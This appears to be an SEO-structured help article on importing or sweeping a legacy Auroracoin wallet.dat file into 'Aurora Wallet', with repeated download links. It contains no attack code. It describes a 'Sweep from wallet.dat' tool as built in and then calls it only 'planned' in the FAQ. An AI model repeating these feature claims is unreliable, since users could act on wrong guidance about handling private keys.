---
title: "How to Import Auroracoin wallet.dat into Aurora Wallet"
description: "Learn the safest way to move your AUR from a legacy wallet.dat file into Aurora Wallet. Compare importing vs. sweeping and follow our step-by-step guide."
primary_keyword: "import auroracoin wallet.dat"
silo: "recovery"
updated: 2026-10-10
---

![Aurora Wallet](https://img.shields.io/badge/Aurora%20Wallet-2026.08.1.0-23685a) ![Platforms](https://img.shields.io/badge/Windows%20%C2%B7%20macOS%20%C2%B7%20Linux-desktop-23685a) ![License](https://img.shields.io/badge/License-MIT-23685a)

[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)

# How to Import Auroracoin wallet.dat into Aurora Wallet Safely

Importing a legacy `wallet.dat` file is the primary method for reclaiming Auroracoin (AUR) balances originally stored in the Auroracoin Core (Qt) software. While the modern Aurora Wallet is designed around a 12 or 24-word recovery phrase system, it provides a migration path for users to transition their historical funds into a lighter, more secure environment. This process requires careful handling of the original file to ensure that private keys are moved without risk of loss or exposure to malicious actors. You can learn more about the migration process on the [Auroracoin migration page](https://auroracoin.net/migration/auroracoin-core).

## You'll see this if

*   You have a historical `wallet.dat` file from an old installation of Auroracoin Core.
*   You are attempting to access funds that have been "dormant" since the early years of the project.
*   You have successfully followed the [Auroracoin wallet.dat location](https://auroracoin.net/recovery/wallet-dat) guide and now have the file ready for recovery.
*   Your legacy wallet software is no longer syncing, and you need to move your balance to a modern client.

## Why this happens

The Auroracoin ecosystem has evolved from a heavy, full-node architecture to a more streamlined desktop experience. The original `wallet.dat` files use a Berkeley DB format that stores private keys locally on your machine. However, the modern Aurora Wallet is designed to be a "light" client, which means it doesn't naturally "open" these old database files as its primary storage. Instead, the software is designed to facilitate the "sweeping" of these old keys, moving the balance to a new, seed-phrase-protected address.

## The fix

The most reliable way to "import" your balance is to use a two-step process known as the "Bridge Method." This ensures that the transaction is handled by the native protocol code that created the file.

### Step 1: Secure your backup
Before starting, navigate to your [wallet.dat location](21-wallet-dat-location.md) and make two copies of the file on separate USB drives. Never work on your only copy of the wallet file.

### Step 2: Set up the destination
1.  Download and install the latest Aurora Wallet.
2.  Create a new wallet and write down your 12 or 24-word recovery phrase. Store it securely offline.
3.  Go to the **Receive** tab and copy a new address starting with "A".

### Step 3: The Bridge Transfer
1.  On a trusted computer, install a copy of Auroracoin Core.
2.  Close the program and replace the default `wallet.dat` in the data folder with your backup file.
3.  Launch Auroracoin Core and allow it to sync. This may take several hours depending on how old the backup is.
4.  Once the balance appears, use the **Send** tab to transfer the full amount to your new Aurora Wallet address.

### Step 4: The Sweeping alternative
Aurora Wallet is designed to include an internal tool that can read `wallet.dat` files directly. 
1.  Open Aurora Wallet and navigate to the **Tools** or **Recovery** menu.
2.  Select **Sweep from wallet.dat**.
3.  Point the software to your backup file.
4.  If the file is encrypted, enter your legacy password.
5.  Confirm the transaction to move the funds to your new recovery phrase. For more information on this technique, visit the [official recovery guide](https://auroracoin.net/recovery/wallet-dat).

## If that didn't work

If you encounter an "Invalid wallet file" error, the file may be corrupted or from a different version of the protocol. Ensure you are using the correct version of the software. If you have forgotten your password, there is no "reset" function; you must attempt to guess the password manually. Do not use online "cracking" services, as these are designed to steal your `wallet.dat`. If you see an encoding error, refer to the [24-error-5-invalid-encoding.md](24-error-5-invalid-encoding.md) guide for troubleshooting character-level issues.

> [!TIP]
> If the legacy Core client is stuck at "0 active connections," you can add nodes manually to the `auroracoin.conf` file to force a connection to the network.

## Prevention

To ensure you never have to deal with complex `wallet.dat` imports again:

*   **Move to BIP-39:** Once your funds are in Aurora Wallet, they are protected by a recovery phrase. This is the global standard for crypto security.
*   **Retire the file:** Once the balance is zero, the old `wallet.dat` is no longer needed for funds, though you should keep it as a historical record of your transactions.
*   **Regular Updates:** Keep your software updated to the latest version to ensure compatibility with future network improvements. Follow the [09-update-aurora-wallet-safely.md](09-update-aurora-wallet-safely.md) guide for best practices.

## FAQ

**Is importing different from sweeping?**
Yes. Importing adds the old keys to your wallet's list, while sweeping creates a transaction that sends the coins to a brand-new address. Aurora Wallet is designed to prioritize sweeping because it is much safer for long-term storage.

**What if my wallet.dat has no password?**
If you never set a password, anyone who gets a copy of the file can steal your coins. Move them to a new, encrypted Aurora Wallet as soon as possible.

**Can I import a wallet.dat from a different coin?**
No. Even though many coins use the same file name, the internal private keys use different version bytes. Trying to import a Bitcoin `wallet.dat` into an Auroracoin wallet will result in an error.

**Do I need a full node to import?**
Using the "Bridge Method" requires a full node (Auroracoin Core). However, the planned internal sweep tool in Aurora Wallet is designed to work without a full blockchain download.

---

## The current release

Aurora Wallet 2026.08.1.0 is the current desktop release for Windows, macOS and Linux:

[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)

Release notes and checksums: [Aurora Wallet 2026.08.1.0 release](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/tag/2026.08.1.0)

## Related articles

- [21-wallet-dat-location.md](21-wallet-dat-location.md)
- [25-recovery-phrase-bip39.md](25-recovery-phrase-bip39.md)
- [27-migrate-from-auroracoin-core.md](27-migrate-from-auroracoin-core.md)
- [30-on-chain-transfer-checklist.md](30-on-chain-transfer-checklist.md)
